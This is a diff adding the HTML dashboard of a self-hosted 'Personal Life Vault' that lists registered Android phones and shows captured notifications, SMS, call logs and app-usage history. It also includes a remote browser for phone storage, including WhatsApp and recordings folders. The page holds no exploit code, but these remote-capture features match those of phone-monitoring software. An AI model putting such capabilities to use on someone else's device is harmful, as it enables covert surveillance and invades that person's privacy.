@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PERSONAL LIFE VAULT — Dashboard</title>
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+
+  <!-- Top Navigation Header -->
+  <header class="vault-header">
+    <div class="header-left">
+      <div class="vault-brand">
+        <span class="vault-icon">🔒</span>
+        <div class="brand-text">
+          <h1>PERSONAL LIFE VAULT</h1>
+          <span class="subtitle">SELF-HOSTED PRIVATE SYSTEM</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="header-center">
+      <nav class="vault-tabs">
+        <button class="tab-btn active" data-tab="devices-tab">
+          <span class="tab-icon">📱</span> DEVICE STATUS
+        </button>
+        <button class="tab-btn" data-tab="timeline-tab">
+          <span class="tab-icon">📊</span> STORAGE PANEL
+        </button>
+        <button class="tab-btn" data-tab="phone-explorer-tab">
+          <span class="tab-icon">📲</span> PHONE STORAGE BROWSER
+        </button>
+        <button class="tab-btn" data-tab="files-tab">
+          <span class="tab-icon">📁</span> VAULT FILES
+        </button>
+      </nav>
+    </div>
+
+    <div class="header-right">
+      <div class="global-status">
+        <span class="status-indicator-dot online" id="global-status-dot"></span>
+        <span class="status-label" id="global-status-text">SERVER ONLINE</span>
+      </div>
+      <a href="/download" class="btn btn-silver btn-sm">📱 Download Android APK</a>
+    </div>
+  </header>
+
+  <!-- Main Content Container -->
+  <main class="vault-container">
+
+    <!-- TAB 1: DEVICE STATUS -->
+    <section id="devices-tab" class="tab-content active">
+      <div class="section-header">
+        <h2>REGISTERED DEVICES & ONLINE TRACKER</h2>
+        <div>
+          <button class="btn btn-outline btn-sm" id="create-db-backup-btn">💾 Backup Laptop Database</button>
+          <button class="btn btn-outline btn-sm" id="refresh-devices-btn">🔄 Refresh Status</button>
+        </div>
+      </div>
+
+      <!-- Quick Metrics Grid -->
+      <div class="metrics-grid">
+        <div class="metric-card">
+          <span class="metric-title">TOTAL DEVICES</span>
+          <span class="metric-value" id="stat-total-devices">0</span>
+          <span class="metric-foot">Registered Android endpoints</span>
+        </div>
+        <div class="metric-card">
+          <span class="metric-title">ACTIVE ONLINE</span>
+          <span class="metric-value text-green" id="stat-online-devices">0</span>
+          <span class="metric-foot">Synced within 5 minutes</span>
+        </div>
+        <div class="metric-card">
+          <span class="metric-title">TOTAL NOTIFICATIONS</span>
+          <span class="metric-value" id="stat-total-notifs">0</span>
+          <span class="metric-foot">Captured client notifications</span>
+        </div>
+        <div class="metric-card">
+          <span class="metric-title">VAULT MEDIA SIZE</span>
+          <span class="metric-value" id="stat-storage-size">0 MB</span>
+          <span class="metric-foot">Physical file storage on laptop</span>
+        </div>
+      </div>
+
+      <!-- Devices List Table -->
+      <div class="vault-table-wrapper">
+        <table class="vault-table">
+          <thead>
+            <tr>
+              <th>STATUS</th>
+              <th>DEVICE NAME</th>
+              <th>DEVICE ID</th>
+              <th>LAST SEEN TIMESTAMP</th>
+              <th>ITEMS SYNCED</th>
+              <th>ACTIONS</th>
+            </tr>
+          </thead>
+          <tbody id="devices-list-body">
+            <tr>
+              <td colspan="6" class="text-center text-muted">Loading registered devices...</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- TAB 2: STORAGE PANEL -->
+    <section id="timeline-tab" class="tab-content">
+      <div class="section-header">
+        <h2>STORAGE PANEL — BACKED UP FILES & ACTIVITY LOGS</h2>
+        <div class="filter-bar">
+          <button class="btn btn-silver btn-sm" id="export-selected-csv-btn" disabled>
+            📄 Export Selected CSV (<span id="timeline-selected-count">0</span>)
+          </button>
+          <button class="btn btn-outline btn-sm" id="export-selected-json-btn" disabled>
+            { } Export Selected JSON
+          </button>
+          <select id="timeline-category-select" class="form-select">
+            <option value="all">All Categories</option>
+            <option value="notifications">Notifications</option>
+            <option value="telecom">SMS & Calls</option>
+            <option value="media">Vault Media</option>
+          </select>
+          <input type="text" id="timeline-search-input" class="form-input" placeholder="Search title, content, or app name...">
+          <button class="btn btn-silver btn-sm" id="timeline-filter-btn">Filter Logs</button>
+        </div>
+      </div>
+
+      <!-- ⚡ DATA TRANSFER ACTIVITY & HISTORY PANEL ("ETNE DER MAI AA GAYA") -->
+      <div style="padding: 0 0 28px 0;">
+        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;">
+          <div style="display:flex;align-items:center;gap:10px;">
+            <span style="font-size:20px;">⚡</span>
+            <h3 style="margin:0;font-size:12px;font-weight:700;letter-spacing:2px;color:#7c6ce0;text-transform:uppercase;">Data Transfer Activity & History ("Etne Der Mai Aa Gaya")</h3>
+          </div>
+          <button class="btn btn-outline btn-sm" id="clear-transfer-log-btn" style="font-size:10px;padding:3px 8px;">🗑️ Clear Log</button>
+        </div>
+        <div id="transfer-activity-panel">
+          <div style="text-align:center;padding:24px;color:var(--text-muted);font-size:12px;background:#141726;border-radius:10px;border:1px solid #2a2d3e;">No active or recent transfers yet.</div>
+        </div>
+      </div>
+
+      <!-- 📱 APP USAGE HISTORY PANEL ("Konsa App Kitne Baje Chala") -->
+      <div style="padding: 0 0 28px 0;">
+        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;">
+          <div style="display:flex;align-items:center;gap:10px;">
+            <span style="font-size:20px;">📱</span>
+            <h3 style="margin:0;font-size:12px;font-weight:700;letter-spacing:2px;color:#50fa7b;text-transform:uppercase;">App Usage Tracker ("Konsa App Kitne Baje Chala")</h3>
+            <span style="font-size:11px;color:var(--text-muted);margin-left:4px;">live app opening time & usage history</span>
+          </div>
+          <button class="btn btn-outline btn-sm" onclick="loadAppUsageTrackerPanel()" style="font-size:10px;padding:3px 8px;">🔄 Refresh App Usage</button>
+        </div>
+        <div id="app-usage-tracker-panel">
+          <div style="text-align:center;padding:24px;color:var(--text-muted);font-size:12px;background:#141726;border-radius:10px;border:1px solid #2a2d3e;">Loading app usage history...</div>
+        </div>
+      </div>
+
+      <!-- 📋 Activity Logs -->
+      <div>
+        <div style="display:flex;align-items:center;gap:10px;margin-bottom:14px;">
+          <span style="font-size:20px;">📋</span>
+          <h3 style="margin:0;font-size:12px;font-weight:700;letter-spacing:2px;color:#7c6ce0;text-transform:uppercase;">Activity Logs (Notifications / SMS / Calls)</h3>
+        </div>
+      <div class="vault-table-wrapper">
+        <table class="vault-table">
+          <thead>
+            <tr>
+              <th width="40"><input type="checkbox" id="select-all-timeline-cb"></th>
+              <th>CATEGORY</th>
+              <th>SOURCE / APP / TYPE</th>
+              <th>TITLE / PARTY</th>
+              <th>CONTENT / PATH / DETAILS</th>
+              <th>EXACT TIMESTAMP</th>
+              <th>DEVICE SOURCE</th>
+            </tr>
+          </thead>
+          <tbody id="timeline-list-body">
+            <tr>
+              <td colspan="7" class="text-center text-muted">Select filter options or loading logs...</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      </div>
+    </section>
+
+
+    <!-- TAB 3: REMOTE PHONE STORAGE EXPLORER & ON-DEMAND BACKUP -->
+    <section id="phone-explorer-tab" class="tab-content">
+      <div class="section-header">
+        <h2>REMOTE PHONE STORAGE EXPLORER & ON-DEMAND FILE BACKUP</h2>
+        <div class="filter-bar">
+          <label style="font-size: 12px; color: var(--text-muted); font-family: var(--font-mono);">SELECT PHONE:</label>
+          <select id="remote-device-select" class="form-select" style="min-width: 220px;">
+            <option value="">Loading registered phones...</option>
+          </select>
+          <button class="btn btn-silver btn-sm" id="refresh-phone-explorer-btn">🔄 Explore Selected Folder</button>
+          <button class="btn btn-silver btn-sm" id="scan-full-schema-btn" style="background: linear-gradient(135deg, #7c6ce0, #50fa7b); color: #000; font-weight: 700;">⚡ Download Storage Schema (Instant Offline Mode)</button>
+          <button class="btn btn-outline btn-sm" id="export-phone-structure-btn">📥 Save Folder Structure (JSON)</button>
+        </div>
+      </div>
+
+      <!-- Quick Shortcuts to Common Storage Paths on Android -->
+      <div class="shortcut-bar" style="margin-bottom: 16px; display: flex; gap: 8px; flex-wrap: wrap;">
+        <span style="font-size: 11px; font-family: var(--font-mono); color: var(--text-muted); align-self: center;">QUICK PATHS:</span>
+        <button class="btn btn-outline btn-sm quick-path-btn" data-path="/storage/emulated/0">📁 Root</button>
+        <button class="btn btn-outline btn-sm quick-path-btn" data-path="/storage/emulated/0/DCIM">📷 Camera (DCIM)</button>
+        <button class="btn btn-outline btn-sm quick-path-btn" data-path="/storage/emulated/0/Recordings">🎙️ Recordings</button>
+        <button class="btn btn-outline btn-sm quick-path-btn" data-path="/storage/emulated/0/Movies">🎥 Videos</button>
+        <button class="btn btn-outline btn-sm quick-path-btn" data-path="/storage/emulated/0/Download">⬇️ Downloads</button>
+        <button class="btn btn-outline btn-sm quick-path-btn" data-path="/storage/emulated/0/Documents">📄 Documents</button>
+        <button class="btn btn-outline btn-sm quick-path-btn" data-path="/storage/emulated/0/WhatsApp">💬 WhatsApp</button>
+        <button class="btn btn-outline btn-sm quick-path-btn" data-path="/storage/emulated/0/Android/media">📱 Android Media</button>
+      </div>
+
+      <!-- Phone Storage Path Breadcrumb Bar -->
+      <div class="breadcrumb-bar" id="phone-breadcrumb">
+        <span class="breadcrumb-root">/storage/emulated/0</span>
+      </div>
+
+      <!-- Phone Folder Sorting Toolbar -->
+      <div style="background: #141726; border: 1px solid #2a2d3e; border-radius: 10px; padding: 10px 16px; margin-bottom: 14px; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 10px;">
+        <div style="display: flex; align-items: center; gap: 8px; flex-wrap: wrap;">
+          <span style="font-size: 11px; font-weight: 700; color: #7c6ce0; font-family: var(--font-mono); letter-spacing: 1px;">SORT THIS FOLDER:</span>
+          <button class="btn btn-outline btn-sm phone-sort-btn active" data-sort="recent" style="font-size: 11px; padding: 4px 10px;">🕒 Recent / New Date</button>
+          <button class="btn btn-outline btn-sm phone-sort-btn" data-sort="old" style="font-size: 11px; padding: 4px 10px;">⏳ Oldest Date</button>
+          <button class="btn btn-outline btn-sm phone-sort-btn" data-sort="high_size" style="font-size: 11px; padding: 4px 10px;">⬆️ High Data Size (Largest)</button>
+          <button class="btn btn-outline btn-sm phone-sort-btn" data-sort="low_size" style="font-size: 11px; padding: 4px 10px;">⬇️ Low Data Size (Smallest)</button>
+          <button class="btn btn-outline btn-sm phone-sort-btn" data-sort="name" style="font-size: 11px; padding: 4px 10px;">🔤 Name (A-Z)</button>
+        </div>
+        <div style="display: flex; align-items: center; gap: 12px;">
+          <button class="btn btn-silver btn-sm" id="batch-phone-backup-btn" disabled style="background: linear-gradient(135deg, #7c6ce0, #a855f7); color: #fff; font-weight: 700; display: inline-flex; align-items: center; gap: 6px; box-shadow: 0 4px 14px rgba(124,108,224,0.35);">
+            <span id="batch-phone-backup-icon">⚡</span> Backup Selected Files (<span id="phone-selected-count">0</span>)
+          </button>
+          <div id="phone-folder-stats" style="font-size: 11px; color: #a0a0c0; font-family: var(--font-mono);">0 items</div>
+        </div>
+      </div>
+
+      <!-- Phone File Listing Table -->
+      <div class="vault-table-wrapper">
+        <table class="vault-table">
+          <thead>
+            <tr>
+              <th width="40"><input type="checkbox" id="phone-select-all-cb" title="Select All Files in Current Folder"></th>
+              <th width="40">TYPE</th>
+              <th>NAME</th>
+              <th>EXACT PHONE PATH</th>
+              <th>SIZE</th>
+              <th>TYPE / MIME</th>
+              <th>ON-DEMAND ACTION</th>
+            </tr>
+          </thead>
+          <tbody id="phone-files-list-body">
+            <tr>
+              <td colspan="7" class="text-center text-muted">Select an online phone above and click "Explore Selected Phone".</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- TAB 4: FILE EXPLORER & PATH BROWSER -->
+    <section id="files-tab" class="tab-content">
+
+      <div class="section-header">
+        <h2>VAULT FILE EXPLORER & MULTI-FILE DOWNLOADER</h2>
+        <div class="file-actions-bar">
+          <button class="btn btn-silver btn-sm" id="batch-download-btn" disabled>
+            💾 Download Selected ZIP (<span id="selected-count">0</span>)
+          </button>
+        </div>
+      </div>
+
+      <!-- Path Breadcrumb Bar -->
+      <div class="breadcrumb-bar" id="file-breadcrumb">
+        <span class="breadcrumb-root">C:\Vault</span>
+        <span class="breadcrumb-sep">/</span>
+        <span class="breadcrumb-current">Root</span>
+      </div>
+
+      <!-- File Listing Table -->
+      <div class="vault-table-wrapper">
+        <table class="vault-table">
+          <thead>
+            <tr>
+              <th width="40"><input type="checkbox" id="select-all-files-cb"></th>
+              <th width="40">TYPE</th>
+              <th>NAME</th>
+              <th>RELATIVE PATH</th>
+              <th>SIZE</th>
+              <th>MODIFIED DATE</th>
+              <th>ACTION</th>
+            </tr>
+          </thead>
+          <tbody id="files-list-body">
+            <tr>
+              <td colspan="7" class="text-center text-muted">Scanning storage directory...</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- ===== BACKUP PROGRESS FLOATING DRAWER (NON-BLOCKING) ===== -->
+  <div id="backup-progress-overlay" style="display:none; position:fixed; bottom:24px; right:24px; width:430px; max-width:calc(100vw - 32px); background:#1a1d2e; border:1.5px solid #7c6ce0; border-radius:14px; box-shadow:0 16px 50px rgba(0,0,0,0.85), 0 0 24px rgba(124,108,224,0.3); z-index:9999; overflow:hidden;">
+    <!-- Drawer Header -->
+    <div style="background:#141726; padding:12px 16px; border-bottom:1px solid #2a2d3e; display:flex; align-items:center; justify-content:space-between;">
+      <div style="display:flex; align-items:center; gap:10px;">
+        <span id="bp-icon" style="font-size:20px;">☁️</span>
+        <div>
+          <div id="bp-header-title" style="color:#7c6ce0; font-size:10px; font-weight:700; letter-spacing:1.5px; text-transform:uppercase;">BACKING UP FROM PHONE</div>
+          <div id="bp-filename" style="color:#fff; font-size:13px; font-weight:600; margin-top:2px; max-width:260px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;"></div>
+        </div>
+      </div>
+      <div style="display:flex; align-items:center; gap:6px;">
+        <button id="bp-minimize-btn" title="Minimize / Expand" style="background:#2a2d3e; border:none; border-radius:6px; color:#a0a0c0; cursor:pointer; width:28px; height:28px; font-size:14px; display:flex; align-items:center; justify-content:center; line-height:1;">—</button>
+        <button id="bp-cancel-btn" title="Close Window" style="background:#2a2d3e; border:none; border-radius:6px; color:#ff5555; cursor:pointer; width:28px; height:28px; font-size:14px; font-weight:bold; display:flex; align-items:center; justify-content:center; line-height:1;">✕</button>
+      </div>
+    </div>
+
+    <!-- Collapsible Drawer Body -->
+    <div id="bp-drawer-body" style="padding:16px;">
+      <!-- Progress Bar -->
+      <div style="background:#2a2d3e; border-radius:8px; height:10px; margin-bottom:12px; overflow:hidden;">
+        <div id="bp-bar" style="height:100%; background:linear-gradient(90deg, #7c6ce0, #a855f7); border-radius:8px; width:0%; transition:width 0.3s ease;"></div>
+      </div>
+
+      <!-- Stats Row -->
+      <div style="display:grid; grid-template-columns:1fr 1fr 1fr; gap:8px; margin-bottom:12px;">
+        <div style="background:#141726; border-radius:8px; padding:8px 6px; text-align:center;">
+          <div style="color:#a0a0c0; font-size:9px; margin-bottom:2px;">TRANSFERRED</div>
+          <div id="bp-transferred" style="color:#7c6ce0; font-size:14px; font-weight:700;">0 B</div>
+        </div>
+        <div style="background:#141726; border-radius:8px; padding:8px 6px; text-align:center;">
+          <div style="color:#a0a0c0; font-size:9px; margin-bottom:2px;">TOTAL SIZE</div>
+          <div id="bp-total-size" style="color:#fff; font-size:14px; font-weight:700;">--</div>
+        </div>
+        <div style="background:#141726; border-radius:8px; padding:8px 6px; text-align:center;">
+          <div style="color:#a0a0c0; font-size:9px; margin-bottom:2px;">TIME ELAPSED</div>
+          <div id="bp-elapsed" style="color:#f0b429; font-size:14px; font-weight:700;">0s</div>
+        </div>
+      </div>
+
+      <!-- Status Text -->
+      <div id="bp-status" style="color:#a0a0c0; font-size:11px; text-align:center; margin-bottom:10px; word-break:break-word;">Sending command to phone...</div>
+      
+      <!-- Mini Log Area -->
+      <div id="bp-log" style="background:#0d0f1a; border-radius:6px; padding:8px; height:60px; overflow-y:auto; font-size:10px; font-family:'JetBrains Mono',monospace; color:#50fa7b; margin-bottom:10px;"></div>
+
+      <button id="bp-dismiss-btn" style="width:100%; padding:8px; background:#2a2d3e; border:1px solid #7c6ce0; border-radius:8px; color:#fff; cursor:pointer; font-size:12px; font-weight:600;">✕ Hide / Continue in Background</button>
+    </div>
+  </div>
+
+  <script src="/js/app.js?v=2.1"></script>
+</body>
+</html>
